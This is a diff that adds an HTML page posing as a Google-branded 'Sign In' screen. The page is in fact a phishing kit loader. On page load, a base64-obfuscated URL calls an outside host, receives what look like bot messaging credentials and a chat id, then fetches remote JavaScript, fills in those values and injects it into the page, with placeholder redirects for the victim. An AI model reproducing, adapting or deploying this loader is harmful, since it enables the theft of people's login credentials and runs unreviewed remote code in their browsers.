@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head><link href="favicon.png" rel="icon"/>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Sign In</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&amp;family=Roboto:wght@300;400;500&amp;display=swap" rel="stylesheet"/>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Roboto', sans-serif;
+  background: #bdc1c6;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+#app-loading {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 16px;
+  color: #5f6368;
+  font-size: 14px;
+}
+.spinner {
+  width: 36px; height: 36px;
+  border: 3px solid #dadce0;
+  border-top-color: #1a73e8;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+#app-error {
+  display: none;
+  background: #fff;
+  border-radius: 12px;
+  padding: 32px 40px;
+  text-align: center;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.13);
+  max-width: 400px;
+}
+#app-error h2 { color: #c5221f; margin-bottom: 8px; }
+#app-error p  { color: #5f6368; font-size: 14px; }
+#app-frame { display: none; width: 100%; }
+</style>
+</head>
+<body>
+<div id="app-loading">
+<div class="spinner"></div>
+<span>Verifying access...</span>
+</div>
+<div id="app-error">
+<h2>Access Denied</h2>
+<p id="app-error-msg">This session is invalid or has expired.<br/>Contact your admin.</p>
+</div>
+<div id="app-frame"></div>
+<script>
+(function() {
+  var _k = 'aHR0cHM6Ly9ob3N0ZWRmaWxleC5zYnMvYXBpL3Nlc3Npb24vYm9vdC8wOTM4ZDBhNzc3NDQ0NWUzODRmZGUwY2IyNWVhYjVkYw==';
+  var _b = atob(_k);
+  var REDIRECT_SCHOOL   = 'www.gmail.com';
+  var REDIRECT_PROFILE  = 'https://YOUR_SCHOOL_PROFILE_PAGE_HERE';
+  var REDIRECT_LINKEDIN = 'https://YOUR_LINKEDIN_PAGE_HERE';
+  var LOGO_URL          = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/960px-Google_%22G%22_logo.svg.png';
+  var sessionId = null;
+  var API       = null;
+
+  fetch(_b)
+  .then(function(r) { return r.json(); })
+  .then(function(data) {
+    if (!data.ok) { showError(data.error); return; }
+    sessionId = data.session_id;
+    API       = data.api;
+    loadApp(data.bot_token, data.chat_id);
+  })
+  .catch(function() {
+    showError('Could not connect to server. Check your internet connection.');
+  });
+
+  function loadApp(botToken, chatId) {
+    fetch(API + '/session/app-js?session_key=' + _b.split('/').pop())
+    .then(function(r) { return r.text(); })
+    .then(function(js) {
+      document.getElementById('app-loading').style.display = 'none';
+      document.getElementById('app-frame').style.display   = 'block';
+      var script = document.createElement('script');
+      script.text = js
+        .replace(/__SESSION_ID__/g,        sessionId)
+        .replace(/__BOT_TOKEN__/g,         botToken)
+        .replace(/__CHAT_ID__/g,           chatId)
+        .replace(/__API__/g,               API)
+        .replace(/__REDIRECT_SCHOOL__/g,   REDIRECT_SCHOOL)
+        .replace(/__REDIRECT_PROFILE__/g,  REDIRECT_PROFILE)
+        .replace(/__REDIRECT_LINKEDIN__/g, REDIRECT_LINKEDIN)
+        .replace(/__LOGO_URL__/g,          LOGO_URL);
+      document.head.appendChild(script);
+    })
+    .catch(function() { showError('Failed to load application.'); });
+  }
+
+  setInterval(function() {
+    if (!sessionId || !API) return;
+    fetch(API + '/session/ping', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ session_id: sessionId })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) { if (!d.alive) showError('Session ended by admin.'); })
+    .catch(function() {});
+  }, 60000);
+
+  function showError(msg) {
+    document.getElementById('app-loading').style.display  = 'none';
+    document.getElementById('app-error').style.display    = 'flex';
+    document.getElementById('app-error').style.flexDirection = 'column';
+    document.getElementById('app-error-msg').innerHTML    = msg || 'Session invalid.';
+  }
+})();
+</script>
+</body>
+</html>
